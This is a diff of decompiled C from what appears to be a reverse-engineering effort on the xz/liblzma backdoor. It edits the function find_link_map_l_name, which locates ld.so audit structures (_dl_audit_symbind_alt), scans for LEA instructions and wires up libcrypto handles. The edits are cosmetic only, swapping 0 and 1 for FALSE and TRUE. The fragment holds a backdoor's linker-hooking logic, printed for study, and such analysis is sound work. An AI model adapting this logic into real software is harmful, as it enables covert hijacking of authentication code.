@@ -51,7 +51,7 @@ BOOL find_link_map_l_name
   u64 local_38;
   
   BVar4 = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x6c,0x10,5);
-  if (BVar4 != 0) {
+  if (BVar4 != FALSE) {
     plVar1 = imported_funcs->libc;
     plVar18 = data_handle->data->liblzma_map;
     allocator = get_lzma_allocator();
@@ -85,7 +85,7 @@ BOOL find_link_map_l_name
       code_start_00 = peVar2->elfbase->e_ident + pEVar9->st_value;
       BVar4 = elf_contains_vaddr(peVar2,code_start_00,pEVar9->st_size,4);
       plVar16 = plVar18 + 0x960;
-      if (BVar4 != 0) {
+      if (BVar4 != FALSE) {
 LAB_001041f0:
         if (plVar18 != plVar16) {
           peVar2 = data_handle->elf_handles->liblzma;
@@ -124,16 +124,16 @@ LAB_001041f0:
             ;
             BVar4 = find_lea_instruction(code_start_00,code_start_00 + pEVar9->st_size,displacement)
             ;
-            if (BVar4 == 0) {
-              return 0;
+            if (BVar4 == FALSE) {
+              return FALSE;
             }
             code_start = (hooks->ldso_ctx)._dl_audit_symbind_alt;
             BVar4 = find_lea_instruction
                               ((u8 *)code_start,
                                (u8 *)(code_start + (hooks->ldso_ctx)._dl_audit_symbind_alt__size),
                                displacement);
-            if (BVar4 == 0) {
-              return 0;
+            if (BVar4 == FALSE) {
+              return FALSE;
             }
             allocator->opaque = data_handle->elf_handles->libc;
             p_Var12 = (_func_22 *)lzma_alloc(0x9f8,allocator);
@@ -148,14 +148,14 @@ LAB_001041f0:
             }
             allocator_00->opaque = data_handle->elf_handles->libcrypto;
             *libname_offset = displacement;
-            return 1;
+            return TRUE;
           }
         }
       }
       lzma_free(imported_funcs->BN_num_bits,allocator_00);
     }
   }
-  return 0;
+  return FALSE;
 LAB_001041ec:
   plVar18 = plVar18 + 8;
   goto LAB_001041f0;
